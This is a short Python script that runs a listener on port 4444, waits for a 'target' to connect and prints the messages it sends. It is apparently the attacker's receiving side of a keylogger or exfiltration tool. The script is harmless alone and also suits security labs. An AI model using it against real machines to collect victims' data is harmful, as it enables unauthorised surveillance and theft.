import pyfiglet
from termcolor import cprint
from time import sleep
import socket

s = socket.socket()
host_name = socket.gethostname()
s_ip = "192.168.1.158" # CHANGE THIS
port = 4444 # CHANGE THIS

s.bind((host_name, port))
s.listen(1)

print("[*] Waiting for target to connect")

conn, add = s.accept()
cprint(f"Recieved connection from {add[0]}", "green")

while True:
	try:
		sleep(3)
		message = conn.recv(1024)
		message = message.decode()
		cprint(message, "cyan")
	except ConnectionResetError:
		cprint(f"[-] The target {add[0]} has been disconnected", "red")
		exit(0)
